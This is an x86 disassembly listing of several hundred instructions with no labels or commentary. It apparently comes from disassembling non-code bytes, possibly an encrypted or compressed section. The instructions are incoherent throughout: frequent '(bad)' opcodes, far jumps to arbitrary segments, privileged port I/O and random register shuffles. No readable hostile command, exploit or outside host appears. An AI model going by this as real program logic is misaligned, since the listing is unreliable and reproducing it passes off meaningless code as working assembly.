  41c9f2:	adc    ch,0xdd
  41c9f5:	ds push edi
  41c9f7:	(bad)  
  41c9f9:	jmp    0x7cb1:0x91a68726
  41ca00:	mov    BYTE PTR [edi],ch
  41ca02:	xchg   DWORD PTR [ecx-0xa559d07],edx
  41ca08:	out    0x3e,eax
  41ca0a:	bound  edx,QWORD PTR [edx-0x712bfdd9]
  41ca10:	mov    bl,0xab
  41ca12:	push   ebx
  41ca13:	jbe    0x41ca93
  41ca15:	and    BYTE PTR [ebx+esi*4-0x42],ch
  41ca19:	sub    BYTE PTR [edi+0x7b],bh
  41ca1c:	sub    DWORD PTR [edx+0x260f309],edx
  41ca22:	adc    bl,bl
  41ca24:	pop    esp
  41ca25:	scas   eax,DWORD PTR es:[edi]
  41ca26:	inc    ebx
  41ca27:	or     DWORD PTR [edi-0x2f],0x5c
  41ca2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2c:	and    dl,cl
  41ca2e:	loopne 0x41ca9f
  41ca30:	lock mov ch,0x84
  41ca33:	inc    esp
  41ca34:	cld    
  41ca35:	daa    
  41ca36:	cs pop esi
  41ca38:	fcomp  QWORD PTR [eax]
  41ca3a:	mov    ebp,0x80c14bed
  41ca3f:	adc    BYTE PTR [ebp+edi*8+0x5c],bl
  41ca43:	in     eax,0xb8
  41ca45:	js     0x41ca30
  41ca47:	aas    
  41ca48:	inc    ebp
  41ca49:	ss sahf 
  41ca4b:	in     al,0x10
  41ca4d:	jnp    0x41ca4b
  41ca4f:	stos   DWORD PTR es:[edi],eax
  41ca50:	inc    ecx
  41ca51:	leave  
  41ca52:	inc    ecx
  41ca53:	adc    cl,BYTE PTR [eax+0x47]
  41ca56:	jl     0x41c9e4
  41ca58:	dec    ecx
  41ca59:	int3   
  41ca5a:	or     DWORD PTR [ebx-0x226a48c3],ebp
  41ca60:	pop    esi
  41ca61:	add    cl,BYTE PTR [eax-0x1b16131a]
  41ca67:	ins    BYTE PTR es:[edi],dx
  41ca68:	and    DWORD PTR [eax+edi*1],esi
  41ca6b:	xor    esi,DWORD PTR [esp-0x6477d35e]
  41ca72:	xor    al,0x21
  41ca74:	lahf   
  41ca75:	mul    DWORD PTR [eax+0x51]
  41ca78:	cmp    BYTE PTR [esi-0x5fe3bb8a],0xbd
  41ca7f:	mov    edx,0x9b025b75
  41ca84:	dec    ecx
  41ca85:	fdecstp 
  41ca87:	int    0xca
  41ca89:	xchg   esp,eax
  41ca8a:	pusha  
  41ca8b:	mov    edi,0x5781b915
  41ca90:	test   al,0x97
  41ca92:	(bad)  
  41ca93:	mov    eax,0x47aae46e
  41ca98:	repz and ah,0x66
  41ca9c:	mul    DWORD PTR [edx+0x57]
  41ca9f:	or     eax,0x602b07a6
  41caa4:	xchg   DWORD PTR [ebx],ecx
  41caa6:	jne    0x41cad6
  41caa8:	test   eax,0x50794cf0
  41caad:	sbb    DWORD PTR [esi+0x27],eax
  41cab0:	ins    BYTE PTR es:[edi],dx
  41cab1:	iret   
  41cab2:	(bad)  
  41cab3:	push   ebp
  41cab4:	xchg   ebp,eax
  41cab5:	mov    bh,0x51
  41cab7:	jmp    0x6ee7:0x6d669d68
  41cabe:	shl    DWORD PTR [ecx],1
  41cac0:	je     0x41cb04
  41cac2:	push   edi
  41cac3:	adc    al,BYTE PTR [edi-0xf]
  41cac6:	or     ecx,ecx
  41cac8:	jecxz  0x41cacc
  41caca:	cs xchg ebx,eax
  41cacc:	ret    0xf250
  41cacf:	inc    ebx
  41cad0:	repnz xor BYTE PTR [edi+eiz*1+0x2],ch
  41cad5:	jnp    0x41ca8e
  41cad7:	clc    
  41cad8:	sub    edx,ecx
  41cada:	in     eax,dx
  41cadb:	mov    bh,BYTE PTR [eax-0xd]
  41cade:	ins    BYTE PTR es:[edi],dx
  41cadf:	aad    0xd3
  41cae1:	pop    es
  41cae2:	push   cs
  41cae3:	nop
  41cae4:	cwde   
  41cae5:	popf   
  41cae6:	pop    esp
  41cae7:	mov    cs,WORD PTR [ebx-0x40c21fc1]
  41caed:	pop    ebp
  41caee:	cdq    
  41caef:	out    0x43,al
  41caf1:	retf   
  41caf2:	fbstp  TBYTE PTR [edx]
  41caf4:	sbb    eax,0xb323704a
  41caf9:	pop    ss
  41cafa:	mov    eax,ds:0x9f44ff31
  41caff:	jno    0x41cafe
  41cb01:	(bad)  
  41cb02:	into   
  41cb03:	data16 mov BYTE PTR [ecx],bh
  41cb06:	or     BYTE PTR [edx+0xa],ah
  41cb09:	dec    esp
  41cb0a:	jae    0x41cb76
  41cb0c:	fiadd  WORD PTR ds:0x1f755410
  41cb12:	add    DWORD PTR [eax+0x71],esp
  41cb15:	test   BYTE PTR [edi],bl
  41cb17:	xchg   ebx,eax
  41cb18:	push   ecx
  41cb19:	aaa    
  41cb1a:	pcmpeqd mm2,QWORD PTR [eax]
  41cb1d:	mov    ebx,0x3b5ed4d2
  41cb22:	or     BYTE PTR [eax+0x43],al
  41cb25:	(bad)
  41cb28:	mov    bl,dl
  41cb2a:	stos   BYTE PTR es:[edi],al
  41cb2b:	shl    dh,cl
  41cb2d:	frstor [edx-0x1fd98445]
  41cb33:	repz sub edx,ebp
  41cb36:	fistp  QWORD PTR [ebp-0x6]
  41cb39:	(bad)  
  41cb3a:	xor    al,0x17
  41cb3c:	mov    DWORD PTR [ecx-0x35],esp
  41cb3f:	lods   eax,DWORD PTR ds:[esi]
  41cb40:	jae    0x41cb29
  41cb42:	cld    
  41cb43:	ret    
  41cb44:	sub    al,dl
  41cb46:	test   eax,0xbb510145
  41cb4b:	int3   
  41cb4c:	mov    BYTE PTR [edi-0x7d1acf50],bl
  41cb52:	popf   
  41cb53:	and    edx,esp
  41cb55:	fldcw  WORD PTR [esi]
  41cb57:	pushf  
  41cb58:	inc    ecx
  41cb59:	(bad)  
  41cb5a:	pop    ss
  41cb5b:	cdq    
  41cb5c:	pop    es
  41cb5d:	xchg   ebp,eax
  41cb5e:	(bad)  
  41cb5f:	fiadd  WORD PTR [edx+0x49d600c1]
  41cb65:	xchg   ebx,eax
  41cb66:	push   cs
  41cb67:	jp     0x41caf2
  41cb69:	and    edx,DWORD PTR [ecx-0x71]
  41cb6c:	pop    ss
  41cb6d:	dec    edi
  41cb6e:	pop    ds
  41cb6f:	test   dl,0xe
  41cb72:	fcmovnbe st,st(5)
  41cb74:	dec    esi
  41cb75:	cli    
  41cb76:	xor    eax,DWORD PTR [eax-0x2]
  41cb79:	and    al,0xda
  41cb7b:	repnz mov DWORD PTR [ecx],ebx
  41cb7e:	bound  esp,QWORD PTR [ecx+0xb]
  41cb81:	sub    eax,0x5bb3759
  41cb86:	and    BYTE PTR [ebx+0x0],bl
  41cb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb8a:	aad    0xbb
  41cb8c:	dec    DWORD PTR [esi+0x4b1eef97]
  41cb92:	ficomp WORD PTR [eax-0x23b54778]
  41cb98:	sub    al,0x90
  41cb9a:	gs aam 0xdc
  41cb9d:	pop    edi
  41cb9e:	sbb    cl,0x25
  41cba1:	out    0x6b,al
  41cba3:	aas    
  41cba4:	fs ins DWORD PTR es:[edi],dx
  41cba6:	pop    ds
  41cba7:	mov    ch,0x8b
  41cba9:	jecxz  0x41cbb8
  41cbab:	pop    edi
  41cbac:	mov    al,0x4f
  41cbae:	fwait
  41cbaf:	stos   BYTE PTR es:[edi],al
  41cbb0:	dec    ecx
  41cbb1:	loopne 0x41cbeb
  41cbb3:	dec    edx
  41cbb4:	int3   
  41cbb5:	inc    eax
  41cbb6:	jae    0x41cc0e
  41cbb8:	gs retf 0x6076
  41cbbc:	scas   al,BYTE PTR es:[edi]
  41cbbd:	(bad)  
  41cbbf:	sti    
  41cbc0:	mov    ah,0x1
  41cbc2:	push   ds
  41cbc3:	cmp    BYTE PTR [edx],0xa7
  41cbc6:	add    eax,0x2f8ca6d8
  41cbcb:	imul   ecx,DWORD PTR [ecx-0x788fcfb7],0xffffffee
  41cbd2:	dec    ecx
  41cbd3:	clc    
  41cbd4:	mov    BYTE PTR [ebx-0x6c1dca43],dl
  41cbda:	mov    eax,0x59e1bb7b
  41cbdf:	lds    esp,FWORD PTR [ebx+0x2]
  41cbe2:	cli    
  41cbe3:	inc    esp
  41cbe4:	adc    bl,BYTE PTR [ecx-0x2f]
  41cbe7:	cmc    
  41cbe8:	pop    es
  41cbe9:	les    ebx,FWORD PTR [edi]
  41cbeb:	mov    bh,0xf0
  41cbed:	outs   dx,BYTE PTR ds:[esi]
  41cbee:	sahf   
  41cbef:	mov    dh,0xec
  41cbf1:	sub    esi,DWORD PTR [esp+edx*8+0x106a6a57]
  41cbf8:	pinsrw mm4,WORD PTR [edx+0x4c97b33f],0x3
  41cc00:	mov    BYTE PTR [edx-0x5e],bl
  41cc03:	pop    ebp
  41cc04:	addr16 out dx,al
  41cc06:	mov    ch,0xd9
  41cc08:	mov    eax,ds:0xb9840e59
  41cc0d:	add    cl,ah
  41cc0f:	pushf  
  41cc10:	inc    eax
  41cc11:	pop    eax
  41cc12:	mov    ds:0x5c65b0f4,eax
  41cc17:	jno    0x41cc22
  41cc19:	mov    ss,WORD PTR [ecx-0x3f]
  41cc1c:	(bad)  
  41cc1d:	int    0x45
  41cc1f:	aam    0x8d
  41cc21:	popf   
  41cc22:	loope  0x41cbd1
  41cc24:	and    eax,0xb455116e
  41cc29:	imul   edi,DWORD PTR [edi],0x23f90985
  41cc2f:	mov    al,ds:0xd4569f82
  41cc34:	add    bh,BYTE PTR [edx-0x2c9a17d6]
  41cc3a:	inc    ecx
  41cc3b:	fidiv  DWORD PTR [ebx-0x763141d5]
  41cc41:	popa   
  41cc42:	(bad)  
  41cc43:	lahf   
  41cc44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc45:	jmp    0x41ccc3
  41cc47:	aad    0x47
  41cc49:	shl    DWORD PTR [eax-0x38],0x6c
  41cc4d:	inc    esi
  41cc4e:	inc    esp
  41cc4f:	push   eax
  41cc50:	mov    BYTE PTR ds:0x4cf911d9,dh
  41cc56:	sbb    BYTE PTR [eax+0x4c6c021f],al
  41cc5c:	mov    ch,0x32
  41cc5e:	shl    BYTE PTR [edx+0x12],0x1d
  41cc62:	push   ds
  41cc63:	imul   ecx,DWORD PTR [edx],0x82e4b72c
  41cc69:	inc    eax
  41cc6a:	aaa    
  41cc6b:	lods   eax,DWORD PTR ds:[esi]
  41cc6c:	(bad)  
  41cc6d:	adc    ch,bh
  41cc6f:	adc    edi,esi
  41cc71:	sbb    DWORD PTR [edi],0x5e9c74bd
  41cc77:	mov    dh,0x9c
  41cc79:	mov    ebx,0x445ed4a2
  41cc7e:	and    sp,WORD PTR [edi-0x5f]
  41cc82:	dec    esp
  41cc83:	cmp    BYTE PTR [ecx-0x7c4c240f],cl
  41cc89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc8a:	popa   
  41cc8b:	test   DWORD PTR [ebx-0x3a232fe9],ebp
  41cc91:	mov    edx,?
  41cc93:	aam    0x48
  41cc95:	xchg   dh,dh
  41cc97:	(bad)  
  41cc98:	xchg   ebp,eax
  41cc99:	dec    ebp
  41cc9a:	jmp    0x1044751e
  41cc9f:	xchg   esp,eax
  41cca0:	mov    ah,0x2d
  41cca2:	adc    ebp,0x75763b3d
  41cca8:	pop    edx
  41cca9:	jno    0x41ccd5
  41ccab:	sbb    al,0x6c
  41ccad:	fbld   TBYTE PTR [eax-0x17]
  41ccb0:	loope  0x41cd28
  41ccb2:	int3   
  41ccb3:	inc    ebp
  41ccb4:	sbb    BYTE PTR [eax-0x4a],ch
  41ccb7:	aam    0xfe
  41ccb9:	ins    BYTE PTR es:[edi],dx
  41ccba:	mov    dl,0xfe
  41ccbc:	sbb    bh,BYTE PTR ds:0xb9899fa5
  41ccc2:	dec    ebp
  41ccc3:	xchg   ebp,eax
  41ccc4:	data16 mov ah,0xe4
  41ccc7:	and    BYTE PTR [ecx+0x2],bl
  41ccca:	push   0x57
  41cccc:	out    0xbd,eax
  41ccce:	lods   al,BYTE PTR ds:[esi]
  41cccf:	jge    0x41cc70
  41ccd1:	add    DWORD PTR [esi],ebx
  41ccd3:	test   eax,0x8864d781
  41ccd8:	hlt    
  41ccd9:	push   cs
  41ccda:	add    dl,ah
  41ccdc:	dec    esi
  41ccdd:	test   al,0x19
  41ccdf:	pop    ebp
  41cce0:	test   eax,0x89a21b9c
  41cce5:	and    DWORD PTR ds:0xbc49f0fd,edi
  41cceb:	or     al,0x7c
  41cced:	add    esp,DWORD PTR [esi-0x30187eb8]
  41ccf3:	cmp    eax,0x376009ac
  41ccf8:	xchg   ebx,eax
  41ccf9:	xor    bh,BYTE PTR [esi-0x5e]
  41ccfc:	dec    edx
  41ccfd:	xor    eax,0x1396bae5
  41cd02:	sub    al,0x7d
  41cd04:	dec    eax
  41cd05:	in     al,0xfb
  41cd07:	jnp    0x41cca4
  41cd09:	bound  ebx,QWORD PTR [edi]
  41cd0b:	and    DWORD PTR [edx+0x2],ebp
  41cd0e:	cmp    esp,DWORD PTR [eax]
  41cd10:	sahf   
  41cd11:	cmp    ecx,DWORD PTR [esp+edx*8-0x6b]
  41cd15:	fisttp DWORD PTR [esi+0x13bad228]
  41cd1b:	jp     0x41cce1
  41cd1d:	mov    ds:0x65ac5c18,eax
  41cd22:	pop    ds
  41cd23:	loope  0x41cd16
  41cd25:	mov    bh,0xc
  41cd27:	mov    dl,0xf4
  41cd29:	add    dl,BYTE PTR [esi+0x7]
  41cd2c:	jmp    0x1fc0:0x2df0f89b
  41cd33:	lahf   
  41cd34:	sub    DWORD PTR [esi+0x51],edi
  41cd37:	aam    0x7b
  41cd39:	dec    esp
  41cd3a:	jbe    0x41cd7e
  41cd3c:	sbb    dl,0x1f
  41cd3f:	(bad)  
  41cd40:	in     al,dx
  41cd41:	test   eax,ebx
  41cd43:	lods   eax,DWORD PTR ds:[esi]
  41cd44:	pop    edx
  41cd45:	jb     0x41cd65
  41cd47:	pop    ebx
  41cd48:	xor    BYTE PTR ds:0xfbd6c84e,0xe6
  41cd4f:	pushf  
  41cd50:	jmp    0xa0b5:0x4cd5f860
  41cd57:	push   eax
  41cd58:	mov    ch,0x58
  41cd5a:	jno    0x41cd07
  41cd5c:	shl    BYTE PTR [edi-0x45],1
  41cd5f:	xlat   BYTE PTR ds:[ebx]
  41cd60:	push   edx
  41cd61:	inc    ch
  41cd63:	mov    ecx,cs
  41cd65:	daa    
  41cd66:	sbb    BYTE PTR [edi+0x2e],bh
  41cd69:	push   esi
  41cd6a:	jo     0x41cd40
  41cd6c:	pop    edx
  41cd6d:	push   cs
  41cd6e:	push   es
  41cd6f:	cmp    DWORD PTR [esp+edx*1+0x1f],esi
  41cd73:	pop    ss
  41cd74:	dec    ebx
  41cd75:	out    0x8c,al
  41cd77:	xchg   esi,eax
  41cd78:	pusha  
  41cd79:	icebp  
  41cd7a:	rcl    ebp,1
  41cd7c:	mov    ecx,0x3a3de227
  41cd81:	xchg   ebp,eax
  41cd82:	xor    cl,bh
  41cd84:	mov    BYTE PTR [edi-0x5eaba74],ah
  41cd8a:	dec    ecx
  41cd8b:	push   0x477e033f
  41cd90:	and    ch,al
  41cd92:	repz dec edi
  41cd94:	ss pushf 
  41cd96:	pusha  
  41cd97:	pop    ecx
  41cd98:	fs mov esp,0xf3768e60
  41cd9e:	or     eax,0x8f9c38bb
  41cda3:	(bad)  
  41cda4:	retf   
  41cda5:	add    edx,eax
  41cda7:	sbb    DWORD PTR [esi],ebx
  41cda9:	mov    dl,0xf6
  41cdab:	push   esp
  41cdac:	mov    DWORD PTR [edi+0x1e],edi
  41cdaf:	push   0xf53e695e
  41cdb4:	adc    BYTE PTR [esi],al
  41cdb6:	mov    esi,0xd22993d5
  41cdbb:	jne    0x41cd9c
  41cdbd:	mov    edi,0x45895666
  41cdc2:	adc    bh,BYTE PTR [ecx+0x6e]
  41cdc5:	pop    edx
  41cdc6:	pop    ebp
  41cdc7:	jmp    0xf025:0xb4560299
  41cdce:	fs jb  0x41cd66
  41cdd1:	push   esi
  41cdd2:	pop    ds
  41cdd3:	cmp    eax,0xf417d5e1
  41cdd8:	xor    al,0xc0
  41cdda:	popf   
  41cddb:	lods   al,BYTE PTR ds:[esi]
  41cddc:	aad    0x18
  41cdde:	push   0xfffffffe
  41cde0:	adc    DWORD PTR [ebx],eax
  41cde2:	pop    ecx
  41cde3:	add    BYTE PTR [ecx],bh
  41cde5:	es xrelease mov BYTE PTR cs:0x2250e361,dh
  41cdee:	mov    ebx,0x5205c123
  41cdf3:	jl     0x41cdad
  41cdf5:	aad    0x8c
  41cdf7:	dec    edi
  41cdf8:	jmp    0x11fb:0xfe9b1a7b
  41cdff:	leave  
  41ce00:	mov    DWORD PTR ds:0x2ccce7bb,ecx
  41ce06:	sbb    bh,al
  41ce08:	mov    esi,0x910eee02
  41ce0d:	dec    edx
  41ce0e:	neg    DWORD PTR [edx+0x41]
  41ce11:	add    BYTE PTR [edx+eax*8],al
  41ce14:	mov    BYTE PTR [edi+0x30],ch
  41ce17:	or     al,0x8e
  41ce19:	cmp    edi,DWORD PTR [ecx]
  41ce1b:	ret    
  41ce1c:	or     bl,BYTE PTR [ebx]
  41ce1e:	test   BYTE PTR [ebp+0x50],cl
  41ce21:	jle    0x41cdc4
  41ce23:	push   ebp
  41ce24:	jp     0x41cde0
  41ce26:	dec    edi
  41ce27:	je     0x41cdb2
  41ce29:	pop    ebp
  41ce2a:	xor    eax,0xfc8ee70
  41ce2f:	xor    al,0x1e
  41ce31:	test   DWORD PTR [ebx-0x59],eax
  41ce34:	mov    bl,ah
  41ce36:	push   0xffffff91
  41ce38:	xlat   BYTE PTR ds:[ebx]
  41ce39:	push   esi
  41ce3a:	add    al,0x69
  41ce3c:	mov    BYTE PTR [ecx+0xa773118],dl
  41ce42:	(bad)  
  41ce44:	mov    al,BYTE PTR ds:0x52a140a2
  41ce4a:	cs mov al,0x3c
  41ce4d:	mov    WORD PTR [edi],ds
  41ce4f:	pop    ss
  41ce50:	aad    0xd3
  41ce52:	ss inc esi
  41ce54:	sbb    al,0x26
  41ce56:	sub    edx,edi
  41ce58:	and    cl,BYTE PTR [eax-0x2a]
  41ce5b:	push   edi
  41ce5c:	jae    0x41ce81
  41ce5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce5f:	fmul   QWORD PTR [ecx-0x4a5805cd]
  41ce65:	mov    ecx,0x355eb86
  41ce6a:	hlt    
  41ce6b:	mov    ecx,0x9f322965
  41ce70:	shl    DWORD PTR [ebx+0x1e],cl
  41ce73:	mov    bl,0xfb
  41ce75:	dec    ebx
  41ce76:	(bad)  
  41ce77:	fnstenv [esi]
  41ce79:	and    ebx,DWORD PTR [ebx+0x6d2e37d0]
  41ce7f:	(bad)  
  41ce80:	jmp    0x9fcaacdb
  41ce85:	xor    DWORD PTR [ebp+0x1],0xd422f213
  41ce8c:	mov    DWORD PTR [ecx],ecx
  41ce8e:	sar    eax,cl
  41ce90:	es add ebp,eax
  41ce93:	pop    ss
  41ce94:	(bad)  
  41ce95:	pop    ebx
  41ce96:	or     al,0xb0
  41ce98:	adc    BYTE PTR [eax+0x1e],ch
  41ce9b:	push   ebp
  41ce9c:	fs dec esi
  41ce9e:	pop    eax
  41ce9f:	push   DWORD PTR [edx+0x5fd40196]
  41cea5:	pushf  
  41cea6:	(bad)  
  41cea7:	outs   dx,BYTE PTR ds:[esi]
  41cea8:	mov    BYTE PTR [eax-0xa779a06],ch
  41ceae:	mov    esi,0x68b35431
  41ceb3:	mov    BYTE PTR [edx+eax*1],al
  41ceb6:	push   0x3120d4d9
  41cebb:	arpl   WORD PTR [esi],ax
  41cebd:	dec    eax
  41cebe:	push   ds
  41cebf:	and    DWORD PTR [eax+0x38c2d82b],0x44d5400a
  41cec9:	mov    ebx,0x29274cbb
  41cece:	or     eax,0x601d786e
  41ced3:	outs   dx,DWORD PTR ds:[esi]
  41ced4:	inc    ebx
  41ced5:	add    BYTE PTR [ecx-0x58],bl
  41ced8:	pop    es
  41ced9:	ins    DWORD PTR es:[edi],dx
  41ceda:	daa    
  41cedb:	in     eax,0xa4
  41cedd:	add    BYTE PTR [edx],ah
  41cedf:	jl     0x41cedb
  41cee1:	leave  
  41cee2:	pop    edi
  41cee3:	mov    eax,ds:0x38e88296
  41cee8:	xchg   esp,eax
  41cee9:	jae    0x41cec2
  41ceeb:	jmp    0x41cf56
  41ceed:	ret    0xc7df
  41cef0:	mov    fs,eax
  41cef2:	jl     0x41cec6
  41cef4:	je     0x41cec3
  41cef6:	xor    ah,ah
  41cef8:	ins    DWORD PTR es:[edi],dx
  41cef9:	frstor [eax-0x16]
  41cefc:	sub    bl,0x1f
  41ceff:	pop    es
  41cf00:	cwde   
  41cf01:	xchg   edi,eax
  41cf02:	les    ebp,FWORD PTR [edi-0x7a9c5f9d]
  41cf08:	inc    edi
  41cf09:	add    edi,DWORD PTR [ebp+ecx*8-0x5e]
  41cf0d:	sub    eax,DWORD PTR [ecx+eiz*8+0x1b60ece9]
  41cf14:	ins    DWORD PTR es:[edi],dx
  41cf15:	mov    BYTE PTR [edx+0x4407725a],bh
  41cf1b:	aam    0xcf
  41cf1d:	test   ecx,0x7e84da9b
  41cf23:	and    ecx,DWORD PTR [esi-0x2fc4bdb3]
  41cf29:	cmc    
  41cf2a:	lods   al,BYTE PTR ds:[esi]
  41cf2b:	and    eax,0xd2d11118
  41cf30:	xchg   esp,eax
  41cf31:	mov    ch,0xb5
  41cf33:	push   ecx
  41cf34:	ret    
  41cf35:	or     eax,DWORD PTR [ecx+0x709a2892]
  41cf3b:	(bad)  [eax+0xc2c6f21]
  41cf41:	lock mov eax,0xd837f6b
  41cf47:	fs out 0x2,al
  41cf4a:	adc    BYTE PTR [edx],cl
  41cf4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4d:	add    DWORD PTR [ebx],ebx
  41cf4f:	addr16 and eax,ebp
  41cf52:	outs   dx,BYTE PTR ds:[esi]
  41cf53:	push   ecx
  41cf54:	cmp    ebx,0xc1c8eeeb
  41cf5a:	in     al,dx
  41cf5b:	rcl    DWORD PTR [edx],0xa4
  41cf5e:	inc    edi
  41cf5f:	in     al,0x85
  41cf61:	add    eax,0x28a69b6a
  41cf66:	cs loope 0x41cf06
  41cf69:	ins    DWORD PTR es:[edi],dx
  41cf6a:	bound  esp,QWORD PTR [edi-0x70]
  41cf6d:	add    eax,0x4c2a87ac
  41cf72:	push   ds
  41cf73:	push   cs
  41cf74:	push   esp
  41cf75:	mov    edi,0x2aab9960
  41cf7a:	mov    edi,0xc52cf22f
  41cf7f:	aad    0x9b
  41cf81:	pop    ebp
  41cf82:	push   edi
  41cf83:	shl    bl,0xff
  41cf86:	mov    ds:0xbdcf88ec,eax
  41cf8b:	jne    0x41cfb4
  41cf8d:	pop    esp
  41cf8e:	mov    eax,ds:0xb4023075
  41cf93:	ja     0x41cf8d
  41cf95:	push   0xe89fe202
  41cf9a:	bound  esp,QWORD PTR ds:0x45d5380d
  41cfa0:	aam    0xbc
  41cfa2:	(bad)  
  41cfa4:	outs   dx,DWORD PTR ds:[esi]
  41cfa5:	add    ch,BYTE PTR [esi-0x4e]
  41cfa8:	retf   
  41cfa9:	stc    
  41cfaa:	repnz jecxz 0x41cfd9
  41cfad:	call   0x60a6f12
  41cfb2:	mov    ch,0x7e
  41cfb4:	in     al,0x5a
  41cfb6:	jmp    0x41cf8c
  41cfb8:	mul    DWORD PTR [ecx]
  41cfba:	(bad)  
  41cfbb:	(bad)  
  41cfbc:	adc    bh,BYTE PTR [eax+eiz*4+0x12]
  41cfc0:	mov    DWORD PTR [edi+0x1c],esp
  41cfc3:	stos   DWORD PTR es:[edi],eax
  41cfc4:	mov    edi,0x2edd54e0
  41cfc9:	jae    0x41cff7
  41cfcb:	xchg   ecx,eax
  41cfcc:	xchg   esp,eax
  41cfcd:	cmp    al,0xc8
  41cfcf:	push   ebp
  41cfd0:	or     DWORD PTR [esi-0x7e],ebp
  41cfd3:	or     al,BYTE PTR [ebp+ebp*8-0x40]
  41cfd7:	dec    ebp
  41cfd8:	in     eax,dx
  41cfd9:	and    BYTE PTR [ecx+esi*1+0x11f605e5],bl
  41cfe0:	dec    eax
  41cfe1:	in     eax,dx
  41cfe2:	shl    DWORD PTR [esp+esi*4],cl
  41cfe5:	dec    ecx
  41cfe6:	inc    esi
  41cfe7:	mov    ebx,0x182d8593
  41cfec:	jecxz  0x41d044
  41cfee:	imul   esp,DWORD PTR [esi+eax*4-0x74b48bab],0xffffff92
  41cff6:	pop    edi
  41cff7:	in     al,dx
  41cff8:	fdiv   DWORD PTR [eax-0xb8a4694]
  41cffe:	or     BYTE PTR [eax-0x6dfa0df8],ah
  41d004:	inc    ebp
  41d005:	jno    0x41d074
  41d007:	sbb    ebx,DWORD PTR [esi]
  41d009:	arpl   WORD PTR [edx-0x13],di
  41d00c:	push   0xf4c1e7bc
  41d011:	and    al,0x5c
  41d013:	jp     0x41d00f
  41d015:	xchg   DWORD PTR [edi+0x5c],ebx
  41d018:	inc    edi
  41d019:	cmp    dh,BYTE PTR [edi-0x27ce7007]
  41d01f:	and    DWORD PTR [eax+0x2a74e4dd],ebp
  41d025:	push   edi
  41d026:	loopne 0x41cfc5
  41d028:	mov    ds:0x354092c,eax
  41d02d:	sbb    eax,0xc2c4fd8f
  41d032:	pusha  
  41d033:	lahf   
  41d034:	ret    0x154
  41d037:	mov    ch,0x52
  41d039:	and    edx,DWORD PTR [ebx-0x3cb54a2b]
  41d03f:	repnz addr16 sbb ecx,edx
  41d043:	call   0x5527:0x76ec3589
  41d04a:	mov    dh,0x59
  41d04c:	mov    WORD PTR [edi+esi*1],cs
  41d04f:	aam    0xa1
  41d051:	fcomp  DWORD PTR [esi-0x161bf470]
  41d057:	add    DWORD PTR [eax+0x729fafd5],0xffffff92
  41d05e:	loopne 0x41cff6
  41d060:	add    al,0x35
  41d062:	ret    
  41d063:	aad    0x6f
  41d065:	add    BYTE PTR [ebp-0x31],bh
  41d068:	sbb    dh,bh
  41d06a:	jo     0x41cff9
  41d06c:	xchg   BYTE PTR ds:0xcf072d6a,cl
  41d072:	pop    ebp
  41d073:	push   ebp
  41d074:	or     DWORD PTR [edi+0x35],edx
  41d077:	shr    edi,1
  41d079:	add    cl,BYTE PTR [eax-0x4f70bd40]
  41d07f:	adc    dl,BYTE PTR [ebx]
  41d081:	sub    dh,BYTE PTR [edi]
  41d083:	mov    bl,0x89
  41d085:	or     DWORD PTR [ebx+0x50f08c12],ecx
  41d08b:	call   0x883bd61d
  41d090:	aaa    
  41d091:	or     dl,dl
  41d093:	sub    al,ch
  41d095:	lods   al,BYTE PTR ds:[esi]
  41d096:	pop    ds
  41d097:	push   ecx
  41d098:	sbb    eax,0xcc5d3118
  41d09d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d09e:	js     0x41d075
  41d0a0:	nop
  41d0a1:	nop
  41d0a2:	xchg   DWORD PTR [eax+0xa],esi
  41d0a5:	and    al,0xeb
  41d0a7:	push   edi
  41d0a8:	mov    BYTE PTR [edi+0x71],dh
  41d0ab:	in     al,dx
  41d0ac:	imul   ebp,esi,0xfffffff8
  41d0af:	fcomip st,st(3)
  41d0b1:	add    BYTE PTR [eax+0x291a4189],bh
  41d0b7:	xchg   ebp,eax
  41d0b8:	test   eax,0x88d66ab5
  41d0bd:	sub    ebp,DWORD PTR [ebx+eax*4-0x628ca4f6]
  41d0c4:	add    al,BYTE PTR [ebx]
  41d0c6:	rcl    BYTE PTR [ebx-0x1c],0xc8
  41d0ca:	mov    bl,0x5b
  41d0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0cd:	fstp   QWORD PTR [edi]
  41d0cf:	jae    0x41d133
  41d0d1:	mov    bh,0x2
  41d0d3:	imul   esp,DWORD PTR [edx-0x572a155a],0x47
  41d0da:	js     0x41d06f
  41d0dc:	xchg   DWORD PTR gs:[esi],esp
  41d0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0e0:	ins    BYTE PTR es:[edi],dx
  41d0e1:	lock pop ds
  41d0e3:	(bad)  
  41d0e5:	rcl    DWORD PTR [ecx+0x3a846230],1
  41d0eb:	aam    0x7f
  41d0ed:	shl    BYTE PTR [ebp-0x44],0x88
  41d0f1:	(bad)  
  41d0f2:	je     0x41d108
  41d0f4:	stc    
  41d0f5:	push   eax
  41d0f6:	pop    ds
  41d0f7:	retf   
  41d0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0f9:	jo     0x41d112
  41d0fb:	je     0x41d09f
  41d0fd:	(bad)  
  41d0ff:	stos   DWORD PTR es:[edi],eax
  41d100:	lods   al,BYTE PTR ds:[esi]
  41d101:	jne    0x41d0de
  41d103:	jb     0x41d114
  41d105:	mov    ds:0x6514e75d,al
  41d10a:	pop    ds
  41d10b:	mov    bl,0xe5
  41d10d:	cwde   
  41d10e:	fist   WORD PTR [edx+esi*4-0x59]
  41d112:	retf   0x70d4
  41d115:	push   eax
  41d116:	push   0x13201b8d
  41d11b:	jmp    0x6361938c
  41d120:	mov    dl,0xae
  41d122:	sbb    bl,al
  41d124:	dec    esi
  41d125:	mov    ecx,0x1a3fa927
  41d12a:	popa   
  41d12b:	jmp    0xd4ded715
  41d130:	sbb    DWORD PTR [esi-0xcc648a0],esp
  41d136:	lahf   
  41d137:	pushf  
  41d138:	pop    esp
  41d139:	mov    eax,0x4e5fd4eb
  41d13e:	stos   DWORD PTR es:[edi],eax
  41d13f:	sbb    ah,BYTE PTR [eax-0x6033368c]
  41d145:	sbb    DWORD PTR [eax],edi
  41d147:	dec    eax
